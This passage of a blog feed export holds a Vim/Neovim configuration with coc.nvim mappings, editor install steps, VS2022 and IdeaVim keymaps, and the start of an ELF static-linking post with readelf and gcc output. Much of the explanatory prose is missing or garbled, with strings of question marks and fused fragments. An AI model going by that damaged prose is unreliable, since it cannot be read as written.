&lt;F4&gt; :AutoformatLine&lt;CR&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;</span> </span><br><span class="line"></span><br><span class="line"><span class="string">&quot;Use 24-bit (true-color) mode in Vim/Neovim when outside tmux.</span></span><br><span class="line"><span class="string">&quot;</span>If yo<span class="string">u&#x27;re using tmux version 2.2 or later, you can remove the outermost $TMUX check and use tmux&#x27;</span>s <span class="number">24</span>-bit color support</span><br><span class="line"><span class="string">&quot;(see &lt; http://sunaku.github.io/tmux-24bit-color.html#usage &gt; for more information.)</span></span><br><span class="line"><span class="string">&quot;</span> <span class="keyword">if</span> (empty($TMUX))</span><br><span class="line">  <span class="string">&quot; if (has(&quot;</span>nvim<span class="string">&quot;))</span></span><br><span class="line"><span class="string">    &quot;</span>For Neovim <span class="number">0.1</span><span class="number">.3</span> and <span class="number">0.1</span><span class="number">.4</span> &lt; https:<span class="comment">//github.com/neovim/neovim/pull/2198 &gt;</span></span><br><span class="line">    <span class="string">&quot; let $NVIM_TUI_ENABLE_TRUE_COLOR=1</span></span><br><span class="line"><span class="string">  &quot;</span> endif</span><br><span class="line">  <span class="string">&quot;For Neovim &gt; 0.1.5 and Vim &gt; patch 7.4.1799 &lt; https://github.com/vim/vim/commit/61be73bb0f965a895bfb064ea3e55476ac175162 &gt;</span></span><br><span class="line"><span class="string">  &quot;</span>Based on Vim patch <span class="number">7.4</span><span class="number">.1770</span> (`guicolors` option) &lt; https:<span class="comment">//github.com/vim/vim/commit/8a633e3427b47286869aa4b96f2bfc1fe65b25cd &gt;</span></span><br><span class="line">  <span class="string">&quot; &lt; https://github.com/neovim/neovim/wiki/Following-HEAD#20160511 &gt;</span></span><br><span class="line"><span class="string">  &quot;</span> <span class="keyword">if</span> (has(<span class="string">&quot;termguicolors&quot;</span>))</span><br><span class="line">    <span class="string">&quot; set termguicolors</span></span><br><span class="line"><span class="string">  &quot;</span> endif</span><br><span class="line"><span class="string">&quot; endif</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;</span> <span class="number">10</span><span class="number">7</span></span><br><span class="line"><span class="keyword">if</span> strftime(<span class="string">&quot;%H&quot;</span>) &gt;= <span class="number">23</span> || strftime(<span class="string">&quot;%H&quot;</span>) &lt;= <span class="number">7</span></span><br><span class="line">    let g:current_colorscheme = <span class="string">&quot;onedark&quot;</span></span><br><span class="line">    let g:onedark_terminal_italics=<span class="number">1</span></span><br><span class="line">    let g:oedark_hide_endofbuffer=<span class="number">1</span></span><br><span class="line">    let g:onedark_termcolors=<span class="number">1</span></span><br><span class="line">    <span class="built_in">set</span> background=dark</span><br><span class="line">    colorscheme onedark</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">        <span class="keyword">if</span> (empty($TMUX))</span><br><span class="line">      <span class="keyword">if</span> (has(<span class="string">&quot;nvim&quot;</span>))</span><br><span class="line">        <span class="string">&quot;For Neovim 0.1.3 and 0.1.4 &lt; https://github.com/neovim/neovim/pull/2198 &gt;</span></span><br><span class="line"><span class="string">        let $NVIM_TUI_ENABLE_TRUE_COLOR=1</span></span><br><span class="line"><span class="string">      endif</span></span><br><span class="line"><span class="string">      &quot;</span>For Neovim &gt; <span class="number">0.1</span><span class="number">.5</span> and Vim &gt; patch <span class="number">7.4</span><span class="number">.1799</span> &lt; https:<span class="comment">//github.com/vim/vim/commit/61be73bb0f965a895bfb064ea3e55476ac175162 &gt;</span></span><br><span class="line">      <span class="string">&quot;Based on Vim patch 7.4.1770 (`guicolors` option) &lt; https://github.com/vim/vim/commit/8a633e3427b47286869aa4b96f2bfc1fe65b25cd &gt;</span></span><br><span class="line"><span class="string">      &quot;</span> &lt; https:<span class="comment">//github.com/neovim/neovim/wiki/Following-HEAD#20160511 &gt;</span></span><br><span class="line">      <span class="keyword">if</span> (has(<span class="string">&quot;termguicolors&quot;</span>))</span><br><span class="line">        <span class="built_in">set</span> termguicolors</span><br><span class="line">      endif</span><br><span class="line">    endif</span><br><span class="line">    let g:current_colorscheme = <span class="string">&quot;one&quot;</span></span><br><span class="line">    <span class="built_in">set</span> background=light</span><br><span class="line">    let g:one_allow_italics = <span class="number">1</span> </span><br><span class="line">    colorscheme one</span><br><span class="line">endif</span><br><span class="line"></span><br><span class="line"><span class="string">&quot; </span></span><br><span class="line"><span class="string">function! ToggleColorscheme()</span></span><br><span class="line"><span class="string">  if g:current_colorscheme == &quot;</span>onedark<span class="string">&quot;</span></span><br><span class="line"><span class="string">    let g:current_colorscheme = &quot;</span>one<span class="string">&quot;</span></span><br><span class="line"><span class="string">    set background=light</span></span><br><span class="line"><span class="string">    let g:one_allow_italics = 1 </span></span><br><span class="line"><span class="string">    &quot;</span>Credit joshdick</span><br><span class="line">    <span class="string">&quot;Use 24-bit (true-color) mode in Vim/Neovim when outside tmux.</span></span><br><span class="line"><span class="string">    &quot;</span>If yo<span class="string">u&#x27;re using tmux version 2.2 or later, you can remove the outermost $TMUX check and use tmux&#x27;</span>s <span class="number">24</span>-bit color support</span><br><span class="line">    <span class="string">&quot;(see &lt; http://sunaku.github.io/tmux-24bit-color.html#usage &gt; for more information.)</span></span><br><span class="line"><span class="string">    if (empty($TMUX))</span></span><br><span class="line"><span class="string">      if (has(&quot;</span>nvim<span class="string">&quot;))</span></span><br><span class="line"><span class="string">        &quot;</span>For Neovim <span class="number">0.1</span><span class="number">.3</span> and <span class="number">0.1</span><span class="number">.4</span> &lt; https:<span class="comment">//github.com/neovim/neovim/pull/2198 &gt;</span></span><br><span class="line">        let $NVIM_TUI_ENABLE_TRUE_COLOR=<span class="number">1</span></span><br><span class="line">      endif</span><br><span class="line">      <span class="string">&quot;For Neovim &gt; 0.1.5 and Vim &gt; patch 7.4.1799 &lt; https://github.com/vim/vim/commit/61be73bb0f965a895bfb064ea3e55476ac175162 &gt;</span></span><br><span class="line"><span class="string">      &quot;</span>Based on Vim patch <span class="number">7.4</span><span class="number">.1770</span> (`guicolors` option) &lt; https:<span class="comment">//github.com/vim/vim/commit/8a633e3427b47286869aa4b96f2bfc1fe65b25cd &gt;</span></span><br><span class="line">      <span class="string">&quot; &lt; https://github.com/neovim/neovim/wiki/Following-HEAD#20160511 &gt;</span></span><br><span class="line"><span class="string">      if (has(&quot;</span>termguicolors<span class="string">&quot;))</span></span><br><span class="line"><span class="string">        set termguicolors</span></span><br><span class="line"><span class="string">      endif</span></span><br><span class="line"><span class="string">    endif</span></span><br><span class="line"><span class="string">    colorscheme one </span></span><br><span class="line"><span class="string">  else</span></span><br><span class="line"><span class="string">    let g:current_colorscheme = &quot;</span>onedark<span class="string">&quot;</span></span><br><span class="line"><span class="string">    let g:onedark_terminal_italics=1</span></span><br><span class="line"><span class="string">    let g:oedark_hide_endofbuffer=1</span></span><br><span class="line"><span class="string">    let g:onedark_termcolors=1</span></span><br><span class="line"><span class="string">    set background=dark</span></span><br><span class="line"><span class="string">    &quot;</span>Use <span class="number">24</span>-bit (<span class="literal">true</span>-color) mode in Vim/Neovim when outside tmux.</span><br><span class="line">    <span class="string">&quot;If you&#x27;re using tmux version 2.2 or later, you can remove the outermost $TMUX check and use tmux&#x27;s 24-bit color support</span></span><br><span class="line"><span class="string">    &quot;</span>(see &lt; http:<span class="comment">//sunaku.github.io/tmux-24bit-color.html#usage &gt; for more information.)</span></span><br><span class="line">    <span class="keyword">if</span> (empty($TMUX))</span><br><span class="line">      <span class="keyword">if</span> (has(<span class="string">&quot;nvim&quot;</span>))</span><br><span class="line">        <span class="string">&quot;For Neovim 0.1.3 and 0.1.4 &lt; https://github.com/neovim/neovim/pull/2198 &gt;</span></span><br><span class="line"><span class="string">        let $NVIM_TUI_ENABLE_TRUE_COLOR=1</span></span><br><span class="line"><span class="string">      endif</span></span><br><span class="line"><span class="string">      &quot;</span>For Neovim &gt; <span class="number">0.1</span><span class="number">.5</span> and Vim &gt; patch <span class="number">7.4</span><span class="number">.1799</span> &lt; https:<span class="comment">//github.com/vim/vim/commit/61be73bb0f965a895bfb064ea3e55476ac175162 &gt;</span></span><br><span class="line">      <span class="string">&quot;Based on Vim patch 7.4.1770 (`guicolors` option) &lt; https://github.com/vim/vim/commit/8a633e3427b47286869aa4b96f2bfc1fe65b25cd &gt;</span></span><br><span class="line"><span class="string">      &quot;</span> &lt; https:<span class="comment">//github.com/neovim/neovim/wiki/Following-HEAD#20160511 &gt;</span></span><br><span class="line">      <span class="keyword">if</span> (has(<span class="string">&quot;termguicolors&quot;</span>))</span><br><span class="line">        <span class="built_in">set</span> termguicolors</span><br><span class="line">      endif</span><br><span class="line">    endif</span><br><span class="line">    colorscheme onedark </span><br><span class="line">  endif</span><br><span class="line">endfunction</span><br><span class="line"></span><br><span class="line"><span class="string">&quot; </span></span><br><span class="line"><span class="string">nnoremap &lt;C-F6&gt; :call ToggleColorscheme()&lt;CR&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;</span> <span class="string">&quot;cocnvim</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;</span>tabshitft tab</span><br><span class="line"><span class="string">&quot; Use tab for trigger completion with characters ahead and navigate</span></span><br><span class="line"><span class="string">&quot;</span> NOTE: There<span class="number">&#x27;</span>s always complete item selected by <span class="keyword">default</span>, you may want to enable</span><br><span class="line"><span class="string">&quot; no select by `&quot;</span>suggest.noselect<span class="string">&quot;: true` in your configuration file</span></span><br><span class="line"><span class="string">&quot;</span> NOTE: Use command <span class="string">&#x27;:verbose imap &lt;tab&gt;&#x27;</span> to make sure tab is not mapped by</span><br><span class="line"><span class="string">&quot; other plugin before putting this into your config</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;</span>tab</span><br><span class="line"><span class="string">&quot; inoremap &lt;silent&gt;&lt;expr&gt; &lt;TAB&gt;</span></span><br><span class="line"><span class="string">&quot;</span>       \ coc<span class="meta">#pum#visible() ? coc#pum#next(1) :</span></span><br><span class="line"><span class="string">&quot;       \ CheckBackspace() ? &quot;</span>\&lt;Tab&gt;<span class="string">&quot; :</span></span><br><span class="line"><span class="string">&quot;</span>       \ coc<span class="meta">#refresh()</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;shift tab</span></span><br><span class="line"><span class="string">inoremap &lt;expr&gt;&lt;S-TAB&gt; coc#pum#visible() ? coc#pum#prev(1) : &quot;</span>\&lt;C-h&gt;<span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;</span> Make &lt;CR&gt; to accept selected completion item or notify coc.nvim to format</span><br><span class="line"><span class="string">&quot; &lt;C-g&gt;u breaks current undo, please make your own choice</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;</span></span><br><span class="line"><span class="string">&quot; inoremap &lt;silent&gt;&lt;expr&gt; &lt;CR&gt; coc#pum#visible() ? coc#pum#confirm()</span></span><br><span class="line"><span class="string">                              &quot;</span> \: <span class="string">&quot;\&lt;C-g&gt;u\&lt;CR&gt;\&lt;c-r&gt;=coc#on_enter()\&lt;CR&gt;&quot;</span></span><br><span class="line"><span class="string">&quot;tab ctrl jctrl k</span></span><br><span class="line"><span class="string">inoremap &lt;silent&gt;&lt;expr&gt; &lt;TAB&gt;</span></span><br><span class="line"><span class="string">      \ pumvisible() ? &quot;</span>\&lt;C-y&gt;<span class="string">&quot; :</span></span><br><span class="line"><span class="string">      \ CheckBackspace() ? &quot;</span>\&lt;Tab&gt;<span class="string">&quot; :</span></span><br><span class="line"><span class="string">      \ &quot;</span>\&lt;TAB&gt;<span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">function! CheckBackspace() abort</span></span><br><span class="line"><span class="string">  let col = col(&#x27;.&#x27;) - 1</span></span><br><span class="line"><span class="string">  return !col || getline(&#x27;.&#x27;)[col - 1]  =~# &#x27;\s&#x27;</span></span><br><span class="line"><span class="string">endfunction</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;</span>cocnvim config</span><br><span class="line"></span><br><span class="line"><span class="string">&quot; Having longer updatetime (default is 4000 ms = 4s) leads to noticeable</span></span><br><span class="line"><span class="string">&quot;</span> delays and poor user experience</span><br><span class="line"><span class="string">&quot; </span></span><br><span class="line"><span class="string">set updatetime=200</span></span><br><span class="line"><span class="string">&quot;</span> Always show the signcolumn, otherwise it would shift the text each time</span><br><span class="line"><span class="string">&quot; diagnostics appear/become resolved</span></span><br><span class="line"><span class="string">set signcolumn=yes</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;</span>ctrl o </span><br><span class="line">inoremap &lt;silent&gt;&lt;expr&gt; &lt;c-o&gt; coc<span class="meta">#refresh()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;+-</span></span><br><span class="line"><span class="string">nmap &lt;silent&gt; &lt;space&gt;- &lt;Plug&gt;(coc-diagnostic-prev)</span></span><br><span class="line"><span class="string">nmap &lt;silent&gt; &lt;space&gt;= &lt;Plug&gt;(coc-diagnostic-next)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;</span></span><br><span class="line"><span class="string">&quot; GoTo code navigation</span></span><br><span class="line"><span class="string">nmap &lt;silent&gt; gd &lt;Plug&gt;(coc-definition)</span></span><br><span class="line"><span class="string">nmap &lt;silent&gt; gy &lt;Plug&gt;(coc-type-definition)</span></span><br><span class="line"><span class="string">nmap &lt;silent&gt; gi &lt;Plug&gt;(coc-implementation)</span></span><br><span class="line"><span class="string">nmap &lt;silent&gt; gr &lt;Plug&gt;(coc-references)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;</span>g+h</span><br><span class="line">nnoremap &lt;silent&gt; gh :call ShowDocumentation()&lt;CR&gt;</span><br><span class="line"></span><br><span class="line">function! ShowDocumentation()</span><br><span class="line">  <span class="keyword">if</span> CocAction(<span class="string">&#x27;hasProvider&#x27;</span>, <span class="string">&#x27;hover&#x27;</span>)</span><br><span class="line">    call CocActionAsync(<span class="string">&#x27;doHover&#x27;</span>)</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    call feedkeys(<span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;in&#x27;</span>)</span><br><span class="line">  endif</span><br><span class="line">endfunction</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;</span></span><br><span class="line"><span class="string">&quot;</span> Highlight the symbol and its references when holding the cursor</span><br><span class="line">autocmd CursorHold * silent call CocActionAsync(<span class="string">&#x27;highlight&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot; leader\ </span></span><br><span class="line"><span class="string">&quot;</span> Symbol renaming</span><br><span class="line">let mapleader=<span class="string">&quot; &quot;</span></span><br><span class="line">nmap &lt;leader&gt;rn &lt;Plug&gt;(coc-rename)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;f tab2  </span></span><br><span class="line"><span class="string">&quot;</span> Formatting selected code</span><br><span class="line"><span class="string">&quot; xmap &lt;leader&gt;f  &lt;Plug&gt;(coc-format-selected)</span></span><br><span class="line"><span class="string">&quot;</span> nmap &lt;leader&gt;f  &lt;Plug&gt;(coc-format-selected)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot; Applying code actions to the selected code block</span></span><br><span class="line"><span class="string">&quot;</span> Example: `&lt;leader&gt;aap` <span class="keyword">for</span> current paragraph</span><br><span class="line">xmap &lt;leader&gt;a  &lt;Plug&gt;(coc-codeaction-selected)</span><br><span class="line">nmap &lt;leader&gt;a  &lt;Plug&gt;(coc-codeaction-selected)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;,ai</span></span><br><span class="line"><span class="string">&quot;</span> Map function and class text objects</span><br><span class="line"><span class="string">&quot; NOTE: Requires &#x27;textDocument.documentSymbol&#x27; support from the language server</span></span><br><span class="line"><span class="string">xmap if &lt;Plug&gt;(coc-funcobj-i)</span></span><br><span class="line"><span class="string">omap if &lt;Plug&gt;(coc-funcobj-i)</span></span><br><span class="line"><span class="string">xmap af &lt;Plug&gt;(coc-funcobj-a)</span></span><br><span class="line"><span class="string">omap af &lt;Plug&gt;(coc-funcobj-a)</span></span><br><span class="line"><span class="string">xmap ic &lt;Plug&gt;(coc-classobj-i)</span></span><br><span class="line"><span class="string">omap ic &lt;Plug&gt;(coc-classobj-i)</span></span><br><span class="line"><span class="string">xmap ac &lt;Plug&gt;(coc-classobj-a)</span></span><br><span class="line"><span class="string">omap ac &lt;Plug&gt;(coc-classobj-a)</span></span><br></pre></td></tr></table></figure><p>PlugInstall</p><h4 id="Ubuntu16cocnvim"><a href="#Ubuntu16cocnvim" class="headerlink" title="Ubuntu16cocnvim"></a>Ubuntu16cocnvim</h4><p>vim8</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">sudo add-apt-repository ppa:jonathonf/vim</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install vim</span><br></pre></td></tr></table></figure><p>clangd</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">vim  /etc/apt/sources.<span class="built_in">list</span></span><br><span class="line">deb http:<span class="comment">//apt.llvm.org/xenial/ llvm-toolchain-xenial main</span></span><br><span class="line">deb-src http:<span class="comment">//apt.llvm.org/xenial/ llvm-toolchain-xenial main</span></span><br><span class="line"> W: GPG error: https:<span class="comment">//apt.llvm.org/xenial llvm-toolchain-xenial InRelease: The following signatures couldn&#x27;t be verified because the public key is not available: NO_PUBKEY 15CF4D18AF4F7421</span></span><br><span class="line"></span><br><span class="line">wget -O - https:<span class="comment">//apt.llvm.org/llvm-snapshot.gpg.key|sudo apt-key add -</span></span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install clangd</span><br></pre></td></tr></table></figure><p></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">sudo apt install ppa-purge &amp;&amp; sudo ppa-purge ppa:jonathonf/vim</span><br></pre></td></tr></table></figure><h2 id="vs2022"><a href="#vs2022" class="headerlink" title="vs2022"></a>vs2022</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">inoremap jk &lt;ESC&gt;</span><br><span class="line">nmap &lt;C-O&gt; :vsc View.NavigateBackward&lt;CR&gt;</span><br><span class="line">nmap &lt;C-I&gt; :vsc View.NavigateForward&lt;CR&gt;</span><br><span class="line">nmap gd :vsc Edit.GoToDefinition&lt;CR&gt;</span><br><span class="line">nmap gh :vsc Edit.QuickInfo&lt;CR&gt;</span><br><span class="line">nnoremap &lt;s-k&gt; gt</span><br><span class="line">nnoremap &lt;s-J&gt; gT</span><br><span class="line">nnoremap &lt;S-q&gt; :q!&lt;CR&gt;</span><br></pre></td></tr></table></figure><h2 id="ideavim"><a href="#ideavim" class="headerlink" title="ideavim"></a>ideavim</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">inoremap jk &lt;ESC&gt;</span><br><span class="line"><span class="built_in">set</span> sneak</span><br><span class="line"><span class="built_in">set</span> surround</span><br><span class="line"><span class="built_in">set</span> commentary</span><br><span class="line"><span class="built_in">set</span> argtextobj</span><br><span class="line"><span class="built_in">set</span> hlsearch</span><br><span class="line"><span class="built_in">set</span> smartcase</span><br><span class="line"><span class="built_in">set</span> scrolloff=<span class="number">5</span></span><br><span class="line"><span class="built_in">set</span> cursorline</span><br><span class="line"><span class="built_in">set</span> ts=<span class="number">4</span></span><br><span class="line"><span class="built_in">set</span> softtabstop=<span class="number">4</span></span><br><span class="line"><span class="built_in">set</span> keep-english-in-normal</span><br><span class="line"><span class="built_in">set</span> shiftwidth=<span class="number">4</span></span><br><span class="line"><span class="built_in">set</span> expandtab</span><br><span class="line"><span class="built_in">set</span> cindent</span><br><span class="line"><span class="built_in">set</span> autoindento</span><br><span class="line">let mapleader=<span class="string">&quot; &quot;</span></span><br><span class="line">Plug <span class="string">&#x27;preservim/nerdtree&#x27;</span></span><br><span class="line">Plug <span class="string">&#x27;vim-easymotion&#x27;</span></span><br><span class="line"><span class="built_in">map</span> &lt;C-n&gt; :NERDTreeToggle&lt;CR&gt;</span><br><span class="line"><span class="built_in">set</span> clipboard+=unnamed</span><br><span class="line"><span class="built_in">set</span> incsearch</span><br><span class="line"><span class="built_in">map</span> &lt;Leader&gt; &lt;Plug&gt;(easymotion-prefix)</span><br><span class="line"><span class="built_in">set</span> relativenumber</span><br><span class="line"><span class="built_in">map</span> &lt;leader&gt;rn &lt;Action&gt;(RenameElement)</span><br><span class="line"><span class="built_in">map</span> gh &lt;Action&gt;(ParameterInfo)  </span><br><span class="line"><span class="built_in">set</span> noerrorbells</span><br><span class="line"><span class="built_in">set</span> visualbell</span><br><span class="line"><span class="built_in">set</span> showmode</span><br><span class="line">nnoremap &lt;s-k&gt; gt</span><br><span class="line">nnoremap &lt;s-J&gt; gT</span><br><span class="line">nnoremap &lt;S-q&gt; :q!&lt;CR&gt;</span><br></pre></td></tr></table></figure><h2 id="vim-gt-neovim"><a href="#vim-gt-neovim" class="headerlink" title="vim&gt;neovim"></a>vim&gt;neovim</h2><p>9.0</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">sudo snap install nvim  --classic</span><br></pre></td></tr></table></figure><p><a href="https://neovim.io/doc/user/nvim.html#nvim-from-vim">https://neovim.io/doc/user/nvim.html#nvim-from-vim</a></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">sudo apt install neovim</span><br><span class="line">mkdir -p ~/.config/nvim/</span><br><span class="line">touch init.vim    </span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">nvim init.vim</span><br><span class="line">:exe <span class="string">&#x27;edit &#x27;</span>.stdpath(<span class="string">&#x27;config&#x27;</span>)<span class="number">.&#x27;</span>/init.vim<span class="number">&#x27;</span></span><br><span class="line">:write ++p</span><br></pre></td></tr></table></figure><p>init.vim</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> runtimepath^=~/.vim runtimepath+=~/.vim/after</span><br><span class="line">let &amp;packpath = &amp;runtimepath</span><br><span class="line">source ~/.vimrc</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">cd ~/.local/share/nvim</span><br><span class="line">ln -s ~/.vim/plugged/ ./plugged</span><br></pre></td></tr></table></figure><p>vinvim</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">cd /usr/bin</span><br><span class="line">sudo rm vi</span><br><span class="line">sudo ln -s nvim vi</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ELF(ELF Static link)</title>
      <link href="/2023/04/28/static-link/"/>
      <url>/2023/04/28/static-link/</url>
      
        <content type="html"><![CDATA[<h1 id="ELF-Static-link"><a href="#ELF-Static-link" class="headerlink" title="ELF Static link"></a>ELF Static link</h1><p><img src="/2023/04/28/static-link/image-20230428222115232.png" alt="image-20230428222115232"></p><p>elfelfProgram Header tableelfSection Header table</p><p>?????????????????????????????????????????????????????????????????????????????</p><p>Program Header tablesection</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 /m/h/s/l/chapter7&gt; readelf -l xxx.so</span><br><span class="line"></span><br><span class="line">Elf file type is <span class="title function_">DYN</span> <span class="params">(Shared object file)</span></span><br><span class="line">Entry point 0x420</span><br><span class="line">There are 7 program headers, starting at offset 52</span><br><span class="line"></span><br><span class="line">Program Headers:</span><br><span class="line">  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align</span><br><span class="line">  LOAD           0x000000 0x00000000 0x00000000 0x00678 0x00678 R E 0x1000</span><br><span class="line">  LOAD           0x000efc 0x00001efc 0x00001efc 0x0011c 0x00124 RW  0x1000</span><br><span class="line">  DYNAMIC        0x000f08 0x00001f08 0x00001f08 0x000e0 0x000e0 RW  0x4</span><br><span class="line">  NOTE           0x000114 0x00000114 0x00000114 0x00024 0x00024 R   0x4</span><br><span class="line">  GNU_EH_FRAME   0x0005b4 0x000005b4 0x000005b4 0x0002c 0x0002c R   0x4</span><br><span class="line">  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x10</span><br><span class="line">  GNU_RELRO      0x000efc 0x00001efc 0x00001efc 0x00104 0x00104 R   0x1</span><br><span class="line"></span><br><span class="line"> Section to Segment mapping:</span><br><span class="line">  Segment Sections...</span><br><span class="line">   00     .note.gnu.build-id .gnu.hash .dynsym .dynstr .gnu.version .gnu.version_r .rel.dyn .rel.plt .init .plt .plt.got .text .fini .eh_frame_hdr .eh_frame</span><br><span class="line">   01     .init_array .fini_array .jcr .dynamic .got .got.plt .data .bss</span><br><span class="line">   02     .dynamic</span><br><span class="line">   03     .note.gnu.build-id</span><br><span class="line">   04     .eh_frame_hdr</span><br><span class="line">   05</span><br><span class="line">   06     .init_array .fini_array .jcr .dynamic .got</span><br></pre></td></tr></table></figure><p>lOAD Section to Segment mappingsection</p><blockquote><p>,sectionsectionsection</p></blockquote><h2 id=""><a href="#" class="headerlink" title=""></a></h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 /m/h/S/l/chapter3&gt; gcc --version</span><br><span class="line">gcc (Ubuntu 5.4.0-6ubuntu1~16.04.12) 5.4.0 20160609</span><br><span class="line">Copyright (C) 2015 Free Software Foundation, Inc.</span><br><span class="line">This is free software; see the source for copying conditions.  There is NO</span><br><span class="line">warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.</span><br></pre></td></tr></table></figure><p>11.3.0 just a little bit</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22-wsl ~/s/nemu [SIGINT]&gt; gcc --version</span><br><span class="line">gcc (Ubuntu 11.3.0-1ubuntu1~22.04) 11.3.0</span><br><span class="line">Copyright (C) 2021 Free Software Foundation, Inc.</span><br><span class="line">This is free software; see the source for copying conditions.  There is NO</span><br><span class="line">warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.</span><br></pre></td></tr></table></figure><p>GNU Binutils  <a href="https://www.gnu.org/software/binutils/">https://www.gnu.org/software/binutils/</a> </p><p>32</p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>hello world</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;hello world&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>idegcc,make</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 /m/h/S/l/chapter3&gt; gcc test2.c</span><br><span class="line">grxer@Ubuntu16 /m/h/S/l/chapter3&gt; ./a.out</span><br><span class="line">hello world</span><br></pre></td></tr></table></figure><p>gcc</p><p>gcc</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">verbose</span><br><span class="line">    Enable showing the tree dump <span class="keyword">for</span> each statement.</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 /m/h/S/l/chapter3&gt; gcc --verbose test2.c</span><br><span class="line">Using built-in specs.</span><br><span class="line">COLLECT_GCC=gcc</span><br><span class="line">COLLECT_LTO_WRAPPER=/usr/lib/gcc/x86_64-linux-gnu/<span class="number">5</span>/lto-wrapper</span><br><span class="line">Target: x86_64-linux-gnu</span><br><span class="line">Configured with: ../src/configure -v --with-pkgversion=<span class="string">&#x27;Ubuntu 5.4.0-6ubuntu1~16.04.12&#x27;</span> --with-bugurl=file:<span class="comment">///usr/share/doc/gcc-5/README.Bugs --enable-languages=c,ada,c++,java,go,d,fortran,objc,obj-c++ --prefix=/usr --program-suffix=-5 --enable-shared --enable-linker-build-id --libexecdir=/usr/lib --without-included-gettext --enable-threads=posix --libdir=/usr/lib --enable-nls --with-sysroot=/ --enable-clocale=gnu --enable-libstdcxx-debug --enable-libstdcxx-time=yes --with-default-libstdcxx-abi=new --enable-gnu-unique-object --disable-vtable-verify --enable-libmpx --enable-plugin --with-system-zlib --disable-browser-plugin --enable-java-awt=gtk --enable-gtk-cairo --with-java-home=/usr/lib/jvm/java-1.5.0-gcj-5-amd64/jre --enable-java-home --with-jvm-root-dir=/usr/lib/jvm/java-1.5.0-gcj-5-amd64 --with-jvm-jar-dir=/usr/lib/jvm-exports/java-1.5.0-gcj-5-amd64 --with-arch-directory=amd64 --with-ecj-jar=/usr/share/java/eclipse-ecj.jar --enable-objc-gc --enable-multiarch --disable-werror --with-arch-32=i686 --with-abi=m64 --with-multilib-list=m32,m64,mx32 --enable-multilib --with-tune=generic --enable-checking=release --build=x86_64-linux-gnu --host=x86_64-linux-gnu --target=x86_64-linux-gnu</span></span><br><span class="line">Thread model: posix</span><br><span class="line">gcc version <span class="number">5.4</span><span class="number">.0</span> <span class="number">20160609</span> (Ubuntu <span class="number">5.4</span><span class="number">.0</span><span class="number">-6u</span>buntu1~<span class="number">16.04</span><span class="number">.12</span>)</span><br><span class="line">COLLECT_GCC_OPTIONS=<span class="string">&#x27;-v&#x27;</span> <span class="string">&#x27;-mtune=generic&#x27;</span> <span class="string">&#x27;-march=x86-64&#x27;</span></span><br><span class="line"> /usr/lib/gcc/x86_64-linux-gnu/<span class="number">5</span>/cc1 -quiet -v -imultiarch x86_64-linux-gnu test2.c -quiet -dumpbase test2.c -mtune=generic -march=x86<span class="number">-64</span> -auxbase test2 -version -fstack-protector-strong -Wformat -Wformat-security -o /tmp/ccZSA6XB.s</span><br><span class="line">GNU C11 (Ubuntu <span 